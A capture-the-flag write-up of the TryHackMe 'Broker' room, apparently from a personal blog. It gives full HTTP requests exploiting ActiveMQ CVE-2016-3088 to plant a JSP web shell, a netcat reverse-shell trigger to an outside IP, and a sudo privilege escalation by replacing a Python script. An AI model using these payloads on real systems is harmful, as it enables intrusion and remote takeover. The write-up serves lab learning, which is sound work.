## Broker
*Paul and Max use a rather unconventional way to chat. They do not seem to know that eavesdropping is possible though...*

Medium rated. This is [Broker](https://tryhackme.com/room/broker) from THM. Let's go!

## Ports
SSH, plus ports 1883, 8161 and 44885. What are those?

## 8161
At port 8161 we find *ActiveMQ* version 5.9.0; default creds of admin:admin working. It's an "open source message broker written in Java together with a full Java Message Service client." Yeah sure, why not :/

Anyway it doesn't appear to do anything super useful, although we can click through some of the menus and see there is something called *secret_chat*. Some research reveals it's a 'broker' (a server, more or less) for various transport protocols including the MQTT protocol, which happens to be running on port.... 

## 1883
Yes so okay you might expect you could see the messages via this broker thingy, but no, you can't. For this we need an MQTT client. I try a few different ones - *mosquitto_sub* which I installed via:

``
apt install mosquitto-clients
``

All this would do is endlessly try to connect, without actually connecting. Then I tried *MQTT-Explorer-0.4.0-beta1.AppImage*, and it wouldn't connect either. Then I tried [python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell), and it actually worked (once I changed downgraded the protocol version):

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/broker]

Yikes. Anyway, whatever. Let's pwn this thing.

## A shell, my kingdom for a shell
So access to the server is via an ActiveMQ exploit - CVE-2016-3088. There is a metasploit module for it, but it doesn't work. Or at least it didn't work for me.

I followed [this](https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30), and it did work. 

First, we provoke the server to tell us about a directory:

{% highlight html %}
PUT /fileserver/%80/%80 HTTP/1.1
Host: broker:8161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: Text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Cookie: JSESSIONID=pd3bx4smg2gh693h3n5amjtw
Upgrade-Insecure-Requests: 1
Content-Length: 12

dsasdsadasda
{% endhighlight %}

And the response:

{% highlight html %}
HTTP/1.1 500 /opt/apache-activemq-5.9.0/webapps/fileserver/Â€/Â€ (Not a directory)
Connection: close
Server: Jetty(7.6.9.v20130131)
{% endhighlight %}

Now we use **PUT** to create a webshell; note I typoed the filename!

{% highlight html %}
PUT /fileserver//1.jps HTTP/1.1
Host: broker:8161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Cookie: JSESSIONID=pd3bx4smg2gh693h3n5amjtw
Upgrade-Insecure-Requests: 1
Content-Length: 345

<%@ page import="java.io.*"%>
<%
	out.print("Hello</br>");
	String strcmd = request.getParameter("cmd");
	String line = null;

	Process p=Runtime.getRuntime().exec(strcmd);
	BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));

	while((line = br.readLine()) != null) {
		out.print(line + "</br>");
	}
%>
{% endhighlight %}

But the typo doesn't matter because we have to MOVE it anyway, since it doesn't have execute permission where we created it anyway.

{% highlight html %}
MOVE /fileserver//1.jps HTTP/1.1
Destination: file:///opt/apache-activemq-5.9.0/webapps/admin/1.jsp
Host: broker:8161
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 0
{% endhighlight %}

Now we've got that we can do:

``
http://broker:8161/admin/1.jsp?cmd=cat+/etc/passwd
``

Or whatever. It took a while to find a reverse shell trigger but this one did it:

``
http://broker:8161/admin/1.jsp?cmd=nc%20-e%20/bin/sh%2010.9.10.123%201234
``

## Privesc
We're on the box as *activemq* and we get the user flag. Privesc is simple; we can run a python script as root and we own that script. Here's my method:

{% highlight shell %}
activemq@activemq:/opt/apache-activemq-5.9.0$ sudo -l
sudo -l
Matching Defaults entries for activemq on activemq:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
# let's get that out of the way
activemq@activemq:/opt/apache-activemq-5.9.0$ mv subscribe.py no.py
# make our own
activemq@activemq:/opt/apache-activemq-5.9.0$ printf 'import os\nos.system("/bin/bash")\n' >> subscribe.py
activemq@activemq:/opt/apache-activemq-5.9.0$ chmod +x subscribe.py
# run it
activemq@activemq:/opt/apache-activemq-5.9.0$ sudo -u root /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
root@activemq:/opt/apache-activemq-5.9.0# id;hostname
id;hostname
uid=0(root) gid=0(root) groups=0(root)
activemq
{% endhighlight %}

Done! Not super easy; quite satisfying to do so thumbs up to ripcurlz and ms.geeky.
